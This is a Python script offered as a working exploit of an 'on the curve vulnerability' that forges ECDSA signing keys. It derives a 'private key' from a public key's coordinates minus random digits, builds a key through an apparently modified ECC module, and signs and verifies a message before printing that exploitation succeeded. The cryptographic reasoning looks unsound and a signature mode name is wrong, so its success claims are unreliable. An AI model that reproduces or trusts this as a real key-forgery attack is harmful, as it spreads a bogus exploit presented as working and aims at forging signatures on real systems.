import ECC
from Crypto.PublicKey import ECC as _ECC
from Crypto.Math.Numbers import Integer
from Crypto.Signature import DSS
from Crypto.Hash import SHA256
import random
import string


def RNG(size):
    letters = string.digits
    return Integer(int(''.join(random.choice(letters) for i in range(size))))


f = open('ecc.pem','rt')
key = ECC.import_key(f.read())
x = key.pointQ.x
y = key.pointQ.y
curve=key.curve
print(f"X: {x}")
print(f"Y: {y}")
_d = x+y
size = len(str(_d))-1
scalar = RNG(size)
d = _d-scalar
print(f"D: {d}")
try:
    _key = ECC.construct(d=d,point_x=x,point_y=y,curve=curve)
    if _key.pointQ.x == x:
        print("---"*26)
        print(f"Spoofed X: {_key.pointQ.x}")
        print("X matches")
        _x = True
    if _key.pointQ.y == y:
        print(f"Spoofed Y: {_key.pointQ.y}")
        print("Y matches")
        _y = True
    if _x == True and _y == True:
        print("---"*26)
        print("Testing signature")
        print("Exporting Key")
        print(_key.export_key(format='PEM'))
        fh = open('key.pem', 'w')
        fh.write(_key.export_key(format='PEM'))
        fh.close()
        f = open('key.pem','rt')
        skey = _ECC.import_key(f.read())
        message = b"On the Curve vulnerability"
        h = SHA256.new(message)
        signer = DSS.new(skey, 'deterministic-rfc6979')
        signature = signer.sign(h)
        print("deterministic-rfc6979 signature generated")
        f = open('key.pem','rt')
        skey = _ECC.import_key(f.read())
        verifier = DSS.new(skey, 'deterministic-rfc6979')
        verifier.verify(h, signature)
        print("deterministic-rfc6979 signature is validated!")
        print("Successful exploitation of on the curve vulnerability!")
        print("---"*26)
        try:
            f = open('key.pem','rt')
            skey = _ECC.import_key(f.read())
            message = b"On the Curve vulnerability"
            h = SHA256.new(message)
            signer = DSS.new(skey, 'FIPS-183-6')
            signature = signer.sign(h)
            print("Signature generated")
            f = open('key.pem','rt')
            skey = _ECC.import_key(f.read())
            verifier = DSS.new(skey, 'FIPS-183-6')
            verifier.verify(h, signature)
            print("FIPS-183-6 signature is validated!")
            print("Successful exploitation of on the curve vulnerability!")
        except ValueError:
            print("FIPS-183-6 Invalid Signature!")
            exit()
except IndexError:
    print("Key invalid!")
    exit()